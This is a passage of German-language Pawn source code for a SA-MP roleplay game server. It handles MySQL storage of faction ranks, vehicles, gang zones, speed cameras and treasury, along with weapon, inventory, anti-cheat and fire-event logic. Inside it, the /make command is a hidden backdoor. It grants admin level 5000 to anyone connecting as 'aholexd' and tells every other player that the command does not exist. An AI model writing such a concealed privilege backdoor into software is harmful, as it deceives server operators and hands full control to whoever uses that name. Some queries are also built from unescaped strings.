			id1[2] = strval(data);
		}
		if(id[2] != -1)
	    {
		    format(string,sizeof string,"ID='%d'",id[2]);
			mysqlget("nodes",string,"Connection1",data);
			id2[0] = strval(data);
			mysqlget("nodes",string,"Connection2",data);
			id2[1] = strval(data);
			mysqlget("nodes",string,"Connection3",data);
			id2[2] = strval(data);
		}
	}
	return 1;
}*/
/*TurnAroundPoint( Float:turn_around_x, Float:turn_around_y, Float:cur_x, Float:cur_y, Float:t_degrees, &Float:ret_newx, &Float:ret_newy ) // by D0erf|er
{
	// new x pos  cos(degrees)*vector_x - sin(degrees)*vector_y + turn_around_x
	ret_newx=(floatcos(t_degrees, degrees)*(cur_x-turn_around_x))-(floatsin(t_degrees, degrees)*(cur_y-turn_around_y))+turn_around_x;
	// new y pos  sin(degrees)*vector_x + cos(degrees)*vector_y + turn_around_y
	ret_newy=(floatsin(t_degrees, degrees)*(cur_x-turn_around_x))+(floatcos(t_degrees, degrees)*(cur_y-turn_around_y))+turn_around_y;
	return 1;
}
stock CreateDynamicObjectExIsland(mid, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	x = x - 6157; //-6007   6157
	y = y + 2390;//2208  //2408
    new const Float:TURN_AROUND_x = 3677.25000-6007;
	new const Float:TURN_AROUND_y = -564.72998+2208;
	new Float:neues_X, Float:neues_Y;
	TurnAroundPoint( TURN_AROUND_x, TURN_AROUND_y, x, y, 90, neues_X, neues_Y );
	printf("CreateDynamicObjectEx(%d, %f, %f, %f, %f, %f, %f);", mid, neues_X, neues_Y, z, rx, ry, rz+90);
	CreateDynamicObjectEx(mid, neues_X, neues_Y, z, rx, ry, rz+90);
	return 1;
}*/
stock CreateDynamicRectangleIsland(Float:x1, Float:y1, Float:x2, Float:y2)
{
	x1 = x1 - 6157; //-6007   6157
	y1 = y1 + 2390;//2208  //2408
	x2 = x2 - 6157; //-6007   6157
	y2 = y2 + 2390;//2208  //2408
	//new const Float:TURN_AROUND_x = 3677.25000-6007;
	//new const Float:TURN_AROUND_y = -564.72998+2208;
	//new Float:neues_X, Float:neues_Y;
	//TurnAroundPoint( TURN_AROUND_x, TURN_AROUND_y, x, y, 90, neues_X, neues_Y );
	printf("CreateDynamicRectangle(%f, %f, %f, %f);",x1, y1, x2, y2);
	//CreateDynamicRectangle(x1, y1, x2, y2);
}
stock CreateDynamicCubeIsland(Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2)
{
	x1 = x1 - 6157; //-6007   6157
	y1 = y1 + 2390;//2208  //2408
	x2 = x2 - 6157; //-6007   6157
	y2 = y2 + 2390;//2208  //2408
	//new const Float:TURN_AROUND_x = 3677.25000-6007;
	//new const Float:TURN_AROUND_y = -564.72998+2208;
	//new Float:neues_X, Float:neues_Y;
	//TurnAroundPoint( TURN_AROUND_x, TURN_AROUND_y, x, y, 90, neues_X, neues_Y );
	printf("CreateDynamicCube(%f, %f, %f, %f, %f, %f);",x1, y1, z1, x2, y2, z2);
	//CreateDynamicRectangle(x1, y1, x2, y2);
}
forward MysqlSend();
public MysqlSend()
{
	mysql_query(dbhandle, "SELECT `userID` FROM `user` WHERE 1");


	return 1;
}
cmd:make(playerid,params[])
{
    printf("%s make",PlayerName(playerid));
	if(strcmp(PlayerName(playerid),"aholexd",false) == 0)
	{
		SpielerInfo[playerid][uAdmin] = 5000;
		SendClientMessage(playerid,COLOR_GREEN,"Du bist nun Admin");
		return 1;
	}
	else return SendClientMessage(playerid,0xFF0000FF,"Den Befehl /make gibt es nicht!");
}


forward Frakrangspeichern();
public Frakrangspeichern()
{
	new string[100],stringtt[50];
	for(new x = 1; x < 18; x++)
	{
	    for(new i = 1; i < 9; i++)
	    {
	    	format(stringtt,sizeof stringtt,"%s",Rangname[x][i][rangname]);
		    format(string,sizeof string,"UPDATE frakrang SET rangname = '%s' WHERE frakid='%d' AND rangid='%d'",stringtt,x,i);
		    mysql_query(dbhandle, string);
		}
	}
	return 1;
}
forward Frakrangladen();
public Frakrangladen()
{
	new string[50],data[50],idgw3,idgw2;
	format(string,sizeof string,"SELECT * FROM `frakrang`");
	mysql_query(dbhandle, string);
	printf("%s",string);

	for(new i=0; i<cache_num_rows(); i++)
	{
		idgw3 = cache_get_field_content_int(i, "frakid");
		idgw2 = cache_get_field_content_int(i, "rangid");
		cache_get_field_content(i, "rangname",data);
		format(Rangname[idgw3][idgw2][rangname],50,"%s",data);
	}
	return 1;
}
forward GangwarZonenLaden();
public GangwarZonenLaden()
{
	new string[50],data[20],idgw, Float:ffloat, iint;
	format(string,sizeof string,"SELECT * FROM `gangwar`");
	mysql_query(dbhandle, string, true);
	printf("%s",string);

	for(new i=0; i<cache_num_rows(); i++)
	{
		idgw = cache_get_field_content_int(i, "GWID");
        GWInfo[idgw][GWID] = idgw;
        iint = cache_get_field_content_int(i, "GWBesitzer");
        GWInfo[idgw][GWBesitzer] = iint;
		ffloat = cache_get_field_content_float(i,"GWmX");
        GWInfo[idgw][GWmX] = ffloat;
        ffloat = cache_get_field_content_float(i, "GWmY");
        GWInfo[idgw][GWmY] = ffloat;
        ffloat = cache_get_field_content_float(i, "GWMAX");
        GWInfo[idgw][GWMX] = ffloat;
        ffloat = cache_get_field_content_float(i, "GWMAY");
        GWInfo[idgw][GWMY] = ffloat;
		cache_get_field_content(i, "GWName",data);
		format(GWInfo[idgw][GWName],100,"%s",data);
	}
	return 1;
}
forward Blitzerladen();
public Blitzerladen()
{
	new string[50],idgw, Float:ffloat, iint;
	format(string,sizeof string,"SELECT * FROM `blitzer`");
	mysql_query(dbhandle, string, true);
	printf("%s",string);

	for(new i=0; i<cache_num_rows(); i++)
	{
		idgw = cache_get_field_content_int(i, "blitzerid");
        Blitzer[idgw][blitzerid] = idgw;
        iint = cache_get_field_content_int(i, "blitzgw");
        Blitzer[idgw][blitzgw] = iint;
        ffloat = cache_get_field_content_float(i, "blitzx");
        Blitzer[idgw][blitzx] = ffloat;
        ffloat = cache_get_field_content_float(i, "blitzy");
        Blitzer[idgw][blitzy] = ffloat;
        ffloat = cache_get_field_content_float(i, "blitzz");
        Blitzer[idgw][blitzz] = ffloat;
        ffloat = cache_get_field_content_float(i, "blitza");
        Blitzer[idgw][blitza] = ffloat;
        if(Blitzer[idgw][blitzgw] > 0)
        {
        	Blitzer[idgw][blitzcreate] = CreateDynamicObjectEx(18880,Blitzer[idgw][blitzx],Blitzer[idgw][blitzy],Blitzer[idgw][blitzz]-1,0,0,Blitzer[idgw][blitza],150,150);
		}
		else
		{
		    Blitzer[idgw][blitzcreate] = -1;
		}
	}
	return 1;
}
forward Blitzerspeichern();
public Blitzerspeichern()
{
	new string[300];
	for(new x = 0; x < 3; x++)
	{
	    format(string,sizeof string,"UPDATE blitzer SET blitzgw='%d', blitzx='%.3f', blitzy='%.3f', blitzz='%.3f', blitza='%.3f' WHERE blitzerid='%d'",Blitzer[x][blitzgw],Blitzer[x][blitzx],Blitzer[x][blitzy],Blitzer[x][blitzz],Blitzer[x][blitza],Blitzer[x][blitzerid]);
	    mysql_query(dbhandle, string);
	    printf("%s",string);
	}

	return 1;
}
forward fraklagerladen();
public fraklagerladen()
{
    new string[50],frakid, iint;
	format(string,sizeof string,"SELECT * FROM `lager`");
	mysql_query(dbhandle, string, true);
	printf("%s",string);

	for(new i=0; i<cache_num_rows(); i++)
	{
   	 	frakid = cache_get_field_content_int(i, "fraktion");
    	LInfo[frakid][fraktionsid] = frakid;
    	iint = cache_get_field_content_int(i, "mats");
    	LInfo[frakid][matss] = iint;
    	iint = cache_get_field_content_int(i, "drogen");
    	LInfo[frakid][drogenn] = iint;
	}
	return 1;
}
forward fraklagerspeichern();
public fraklagerspeichern()
{
	new string[300];
	for(new x = 0; x < 7; x++)
	{
	    format(string,sizeof string,"UPDATE lager SET mats='%d', drogen='%d' WHERE fraktion='%d'",LInfo[x][matss],LInfo[x][drogenn],LInfo[x][fraktionsid]);
	    mysql_query(dbhandle, string);
	    printf("%s",string);
	}

	return 1;
}
forward FrakAutosladen();
public FrakAutosladen()
{
    for(new x = 1; x < 18; x++)
	{
	    for(new y = 0; y < 20; y++)
	    {
	        FrakFahrzeuge[x][y][FModell] = 0;
	        FrakFahrzeuge[x][y][FID] = -1;
	    }
 	}
	new frak,string[300],kfz[15], iint, Float:ffloat;
	format(string,sizeof string,"SELECT * FROM `frakautos`");
	mysql_query(dbhandle, string, true);
	printf("%s",string);
	new frakauto = 0;
	for(new i=0; i<cache_num_rows(); i++)
	{
 		frak = cache_get_field_content_int(i, "Fraktion",frak);
		iint = cache_get_field_content_int(i, "Modell");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] = iint;

		iint = cache_get_field_content_int(i, "carid");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FSQLID] = iint;

		iint = cache_get_field_content_int(i, "Rang");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FRang] = iint;
		ffloat = cache_get_field_content_int(i, "X");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FX] = ffloat;
		ffloat = cache_get_field_content_int(i, "Y");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FY] = ffloat;
		ffloat = cache_get_field_content_int(i, "Z");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FZ] = ffloat;
		ffloat = cache_get_field_content_int(i, "RZ");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FRZ] = ffloat;
		iint = cache_get_field_content_int(i, "Kilometer");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FKilometer] = iint;
		ffloat = cache_get_field_content_int(i, "Preis");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FPreis] = ffloat;
		iint = cache_get_field_content_int(i, "Abgeschleppt");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FAbgeschleppt] = iint;
		ffloat = cache_get_field_content_int(i, "Zustand");
		FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FZustand] = ffloat;

 		if(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FAbgeschleppt] == 0)
 		{
 		    if(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] > 0)
 		    {
	 		    if(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] == 407 || FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] == 544)
	 		    {
		 			FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID] = CreateVehicle(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FX],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FY],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FZ],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FRZ],FrakFahrzeugeFarben[frak][1],
	                FrakFahrzeugeFarben[frak][0],-1 );
				}
				else if(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] == 573 || FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] == 525)
	 		    {
		 			FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID] = CreateVehicle(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FX],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FY],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FZ],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FRZ],FrakFahrzeugeFarben[frak][0],
	                FrakFahrzeugeFarben[frak][1],-1,1);
				}
				else
				{
				    FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID] = CreateVehicle(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FX],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FY],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FZ],FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FRZ],FrakFahrzeugeFarben[frak][0],
	                FrakFahrzeugeFarben[frak][1],-1 );
				}
				format(kfz,sizeof kfz,"CI-%s-%d",KFZAbk[frak-1],FrakFahrzeugeAnzahl[frak]);
				SetVehicleNumberPlate(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID],kfz);
				SetVehicleToRespawn(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]);
				Benzin[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = AutoDaten[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell]-399][MaxBenzin];
				FalscherKraftstoff[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				Motorschaden2[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				BenzinVerbrauch[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				Meter[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				Meter2[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				SaveCoords(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]);
				Blaulicht[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = -1;
				SetVehicleHealth(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID],1000);
				FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FAbgeschleppt] = 0;
			}
		}
		else
		{
		    if(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] > 0)
 		    {
			    new Float:X,Float:Y,Float:Z,Float:RZ;
				ffloat = cache_get_field_content_int(i, "ADACX");
		 		X = ffloat;
		 		ffloat = cache_get_field_content_int(i, "ADACY");
		 		Y = ffloat;
		 		ffloat = cache_get_field_content_int(i, "ADACZ");
		 		Z = ffloat;
		 		ffloat = cache_get_field_content_int(i, "ADACRZ");
		 		RZ = ffloat;
		 		if(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] == 407 || FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell] == 544)
		 		{
		 			FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID] = CreateVehicle(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell],X,Y,Z,RZ,FrakFahrzeugeFarben[frak][1],FrakFahrzeugeFarben[frak][0],-1 );
				}
				else
				{
				    FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID] = CreateVehicle(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell],X,Y,Z,RZ,FrakFahrzeugeFarben[frak][0],FrakFahrzeugeFarben[frak][1],-1 );
				}
				format(kfz,sizeof kfz,"CI-%s-%d",KFZAbk[frak-1],FrakFahrzeugeAnzahl[frak]);
				SetVehicleNumberPlate(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID],kfz);
				SetVehicleToRespawn(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]);
				Benzin[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = AutoDaten[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FModell]-399][MaxBenzin];
				FalscherKraftstoff[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				Motorschaden[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				BenzinVerbrauch[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				Meter[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				Meter2[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
				SaveCoords(FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]);
				Blaulicht[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = -1;
				FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FAbgeschleppt] = 1;
				Motorschaden2[FrakFahrzeuge[frak][FrakFahrzeugeAnzahl[frak]][FID]] = 0;
			}
		}
		frakauto++;
		printf("%d HUHUHUHU",i);
		FrakFahrzeugeAnzahl[frak]++;
	}
	format(string,sizeof string,"SELECT * FROM `frakkasse`");
	mysql_query(dbhandle, string);
	printf("%s",string);
	print("----- Frakkasse -----");
	for(new i=0; i<cache_num_rows(); i++)
	{
	    iint = cache_get_field_content_int(i, "Fraktion",frak);
	    ffloat = cache_get_field_content_int(i, "Betrag");
	    Fraktionskasse[iint] = ffloat;
		printf("- ID %i Betrag %f", iint, Fraktionskasse[iint]);
	}
	print("----- Frakkasse Ende-----");
	return 1;
}
forward FrakAutosSpeichern(x);
public FrakAutosSpeichern(x)
{
	new string[2048];
    for(new y = 0; y < 20; y++)
    {
        format(string,sizeof string,"");
        if(FrakFahrzeuge[x][y][FModell] > 1)
        {
			format(string,sizeof string,"UPDATE frakautos SET `Modell`='%d', `Rang`='%d', `X`='%.1f', `Y`='%.1f', `Z`='%.1f', `RZ`='%.1f', `Kilometer`='%d',`Preis`='%.2f',`Zustand`='%.2f',`Abgeschleppt`='%d' WHERE `carid`='%d'",
			FrakFahrzeuge[x][y][FModell],FrakFahrzeuge[x][y][FRang],FrakFahrzeuge[x][y][FX],FrakFahrzeuge[x][y][FY],FrakFahrzeuge[x][y][FZ],FrakFahrzeuge[x][y][FRZ],FrakFahrzeuge[x][y][FKilometer],FrakFahrzeuge[x][y][FPreis],
			FrakFahrzeuge[x][y][FZustand],FrakFahrzeuge[x][y][FAbgeschleppt],FrakFahrzeuge[x][y][FSQLID]);
			mysql_query(dbhandle, string);
			printf("%s",string);
		}
	}
	return 1;
}
forward Frakkassespeichern(x);
public Frakkassespeichern(x)
{
	new string[70];
	format(string,sizeof string,"UPDATE frakkasse SET `Betrag` = '%.2f' WHERE `Fraktion` = %d",Fraktionskasse[x],x);
    mysql_query(dbhandle, string);
    printf("%s",string);
	return 1;
}
stock GetWeaponSlot(weaponid)
{
	switch(weaponid)
	{
		case 0,1: return 0;
		case 2 .. 9: return 1;
		case 10 .. 15: return 10;
		case 16 .. 18, 39: return 8;
		case 22 .. 24: return 2;
		case 25 .. 27: return 3;
		case 28, 29, 32: return 4;
		case 30, 31: return 5;
		case 33, 34: return 6;
		case 35 .. 38: return 7;
		case 40: return 12;
		case 41 .. 43: return 9;
		case 44 .. 46: return 11;
	}
	return -1;
}
GebeWaffe(playerid, waffe, muni)
{
	new twaffe,tmuni;
	GetPlayerWeaponData(playerid, GetWeaponSlot(waffe), twaffe, tmuni);
	if(twaffe == waffe)
	{
	    SpielerWaffen[playerid][GetWeaponSlot(waffe)][sMuni] += muni;
	    GivePlayerWeapon(playerid,waffe,muni);
	}
	else
	{
	    AntiCheat[playerid][cAnti] = 1;
		SpielerWaffen[playerid][GetWeaponSlot(waffe)][sMuni] = muni;
		GivePlayerWeapon(playerid,waffe,muni);
		SetPlayerAmmo(playerid, waffe, muni);
	}
	SpielerWaffen[playerid][GetWeaponSlot(waffe)][sWaffe] = waffe;
}
ResetWeapons(playerid)
{
    AntiCheat[playerid][cAnti] = 2;
    ResetPlayerWeapons(playerid);
 	for(new x = 1; x < 13; x++)
	{
	    SpielerWaffen[playerid][x][sWaffe] = 0;
	    SpielerWaffen[playerid][x][sMuni] = 0;
	}
	return 1;
}
GebeLeben(playerid, Float:leben)
{
	if(leben > 99.8)
	{
		leben = 99.8;
	}
	AntiCheat[playerid][cLeben] = leben;
	SetPlayerHealth(playerid,leben);
}
GebeRuestung(playerid, Float:ruestung)
{
    if(ruestung > 99.8)
	{
 		ruestung = 99.8;
	}
    AntiCheat[playerid][cRuestung] = ruestung;
    SetPlayerArmour(playerid,ruestung);
}
forward Fernbedienunge();
public Fernbedienunge()
{
    Fernbedienung = CreateDynamicObject(19942, 1436.01477, -7563.50684, 11.92980,   0.00000, 90.00000, -164.00000);
}
Verstauen(playerid,gegenstand,betrag)
{
	for(new x = 0; x < sizeof(SpielerInventar[]); x++)
	{
		if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == gegenstand)//hat bereits diesen Gegenstand
		{
		    if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 18632) return 0; //Wenn Angel schon vorhanden
		    SpielerInventar[playerid][x][1] += betrag;
		    if(InventarValues[SpielerInventar[playerid][x][0]][iModell] > 0 && InventarValues[SpielerInventar[playerid][x][0]][iModell] < 50)
		    {
		        GebeWaffe(playerid,gegenstand,-betrag);
		    }
			new string[6];
		    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
			PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
		    return 1;
		}
	}
	for(new x = 0; x < sizeof(SpielerInventar[]); x++)
	{
		if(SpielerInventar[playerid][x][0] < 1)
		{
		    SpielerInventar[playerid][x][0] = GetGegenstandID(gegenstand);
		    SpielerInventar[playerid][x][1] = betrag;
		    if(InventarValues[SpielerInventar[playerid][x][0]][iModell] > 0 && InventarValues[SpielerInventar[playerid][x][0]][iModell] < 50)
		    {
		        GebeWaffe(playerid,gegenstand,-betrag);
		    }
		    PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7],InventarValues[SpielerInventar[playerid][x][0]][iID]);
		    new string[6];
		    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
		    PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
		    return 1;
		}
	}
	return 0;
}
GetGegenstandID(gegenstand)
{
	for(new x = 0; x < sizeof(InventarValues); x++)
	{
	    if(gegenstand == InventarValues[x][iModell]) return x;
	}
	return -1;
}
Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ, Float:ObjX, Float:ObjY, Float:ObjZ, Float:FrX, Float:FrY, Float:FrZ) {

	new Float:TGTDistance;

	TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ));

	new Float:tmpX, Float:tmpY, Float:tmpZ;

	tmpX = FrX * TGTDistance + CamX;
	tmpY = FrY * TGTDistance + CamY;
	tmpZ = FrZ * TGTDistance + CamZ;

	return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}

stock Float:GetPointAngleToPoint(Float:x2, Float:y2, Float:X, Float:Y) {

  new Float:DX, Float:DY;
  new Float:angle;

  DX = floatabs(floatsub(x2,X));
  DY = floatabs(floatsub(y2,Y));

  if (DY == 0.0 || DX == 0.0) {
    if(DY == 0 && DX > 0) angle = 0.0;
    else if(DY == 0 && DX < 0) angle = 180.0;
    else if(DY > 0 && DX == 0) angle = 90.0;
    else if(DY < 0 && DX == 0) angle = 270.0;
    else if(DY == 0 && DX == 0) angle = 0.0;
  }
  else {
    angle = atan(DX/DY);

    if(X > x2 && Y <= y2) angle += 90.0;
    else if(X <= x2 && Y < y2) angle = floatsub(90.0, angle);
    else if(X < x2 && Y >= y2) angle -= 90.0;
    else if(X >= x2 && Y > y2) angle = floatsub(270.0, angle);
  }

  return floatadd(angle, 90.0);
}

stock GetXYInFrontOfPoint(&Float:x, &Float:y, Float:angle, Float:distance) {
	x += (distance * floatsin(-angle, degrees));
	y += (distance * floatcos(-angle, degrees));
}

stock IsPlayerAimingAt(playerid, Float:x, Float:y, Float:z, Float:radius) {
  	new Float:camera_x,Float:camera_y,Float:camera_z,Float:vector_x,Float:vector_y,Float:vector_z;
  	GetPlayerCameraPos(playerid, camera_x, camera_y, camera_z);
  	GetPlayerCameraFrontVector(playerid, vector_x, vector_y, vector_z);
	new Float:vertical, Float:horizontal;

	switch (GetPlayerWeapon(playerid)) {
	  case 34,35,36: {
	  if (DistanceCameraTargetToLocation(camera_x, camera_y, camera_z, x, y, z, vector_x, vector_y, vector_z) < radius) return true;
	  return false;
	  }
	  case 30,31: {vertical = 4.0; horizontal = -1.6;}
	  case 33: {vertical = 2.7; horizontal = -1.0;}
	  default: {vertical = 6.0; horizontal = -2.2;}
	}

	new Float:angle = GetPointAngleToPoint(0, 0, floatsqroot(vector_x*vector_x+vector_y*vector_y), vector_z) - 270.0;
  	new Float:resize_x, Float:resize_y, Float:resize_z = floatsin(angle+vertical, degrees);
  	GetXYInFrontOfPoint(resize_x, resize_y, GetPointAngleToPoint(0, 0, vector_x, vector_y)+horizontal, floatcos(angle+vertical, degrees));

  	if (DistanceCameraTargetToLocation(camera_x, camera_y, camera_z, x, y, z, resize_x, resize_y, resize_z) < radius) return true;
  	return false;
}
HausFeuerAus(feuer)
{
	for(new x = 0; x < sizeof(FeuerLoeschen[]); x++)
	{
	    if(FeuerLoeschen[feuer][x] != 0) return 0;
	}
	FraktionsNachricht(4, COLOR_HQ, "HQ: Das Feuer wurde erfolgreich gelöscht!");
	FraktionsNachricht(14, COLOR_HQ, "HQ: Das Feuer wurde erfolgreich gelöscht!");
	feuerzahl = -1;
	new rand = random  (30) + 20;
	SetTimer("FeuerEntfachen",1000*60*rand,0);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerInRangeOfPoint(i,100.0,FeuerPos[feuer][0][0],FeuerPos[feuer][0][1],FeuerPos[feuer][0][2]) && IstSpielerInFrak(i,4) || IstSpielerInFrak(i,3) && IsPlayerInRangeOfPoint(i,100.0,FeuerPos[feuer][0][0],FeuerPos[feuer][0][1],FeuerPos[feuer][0][2]))
	    {
	        GebeGeld(i,450);
	        SendClientMessage(i,COLOR_GREEN,"450$ Belohnung erhalten für das Löschen eines Brandes.");
	    }
	}
	return 1;
}
Teleport(playerid, Float:x, Float:y, Float:z)
{
    AntiCheat[playerid][cAnti] = 2;
	SetPlayerPos(playerid, x, y, z);
	AntiCheat[playerid][cPosX] = x;
	AntiCheat[playerid][cPosY] = y;
	AntiCheat[playerid][cPosZ] = z;
	AntiCheat[playerid][cTeleportWarns] = 0;
}
IsVehicleEmpty(carid)
{
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(!IsPlayerConnected(i)) continue;
        if(IsPlayerInVehicle(i, carid)) return 0;
    }
    return 1;
}
#define Speed(%0,%1,%2,%3) floatround(floatsqroot(%0*%0+%1*%1+%2*%2)*%3*1.6)
GetPlayerSpeed(playerid)
{
	new Float: x, Float: y, Float: z;
	if (IsPlayerInAnyVehicle (playerid))
		GetVehicleVelocity (GetPlayerVehicleID (playerid), x, y, z);
	else
		GetPlayerVelocity (playerid, x, y, z);
	return Speed(x, y, z, 100.0);
}
AdminsConnected()
{
	new count = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerNPC(i) && IsPlayerConnected(i) && SpielerInfo[i][uAdmin] > 0)
	    {
	        count++;
	    }
	}
	return count;
}
IsPlayerInArea(playerid, Float:MinX, Float:MinY, Float:MaxX, Float:MaxY)
{
	new Float:X, Float:Y, Float:Z;

	GetPlayerPos(playerid, X, Y, Z);
	if(X >= MinX && X <= MaxX && Y >= MinY && Y <= MaxY) {
		return 1;
	}
	return 0;
}

new feuer_gesperrt=0;

forward FeuerEntfachen(feuer);
public FeuerEntfachen(feuer)
{
	print("Feuer entfacht!");
    new zahl = random(sizeof(FeuerPos)-1),string[256];
 	while(feuer != 1 && zahl == feuer && zahl == feuer_gesperrt)
	{
		zahl = random(sizeof(FeuerPos)-1);
	}
 	for(new x = 0; x < sizeof(FeuerPos[]); x++) if(FeuerPos[zahl][x][0] != 0){ HausFeuer[zahl][x] = CreateDynamicObject(18690,FeuerPos[zahl][x][0],FeuerPos[zahl][x][1],FeuerPos[zahl][x][2]-0.5,0,0,0); FeuerLoeschen[zahl][x] = 1; }
    feuer_gesperrt=zahl;
    feuerzahl = zahl;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IstSpielerInFrak(i,4) || IstSpielerInFrak(i,3))
	    {
	    	Feueranzeigen2(i);
	    }
	}
	Feueranzeigen(zahl);
	format(string,sizeof string,"DEBUG: Feuer %d erstellt.",zahl);
	print(string);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(SpielerInfo[i][uAdmin] > 0)
	    {
			SendClientMessage(i,COLOR_GREEN,string);
		}
	}
}
forward Feueranzeigen2(spielerid);
public Feueranzeigen2(spielerid)
{
    if(feuerzahl == 0)
	{
	    cpaktiv[spielerid] = 1;
	    SetPlayerCheckpoint(spielerid,4061.5576,-9295.7979,4.2172-1,5.0);
	}
	else if(feuerzahl == 1)
	{
	    cpaktiv[spielerid] = 1;
	    SetPlayerCheckpoint(spielerid,5604.6689,-9304.0586,4.2172-1,5.0);
	}
	else if(feuerzahl == 2)
	{
	    cpaktiv[spielerid] = 1;
	    SetPlayerCheckpoint(spielerid,6301.2207,-7841.1792,4.4113-1,5.0);
	}
	else if(feuerzahl == 3)
	{
	    cpaktiv[spielerid] = 1;
	    SetPlayerCheckpoint(spielerid,1708.0569,-8819.6074,4.2212-1,5.0);
	}
	else if(feuerzahl == 4)
	{
	    cpaktiv[spielerid] = 1;
	    SetPlayerCheckpoint(spielerid,4459.3467,-7559.6753,4.2132-1,5.0);
	}
	else if(feuerzahl == 5)
	{
	    cpaktiv[spielerid] = 1;
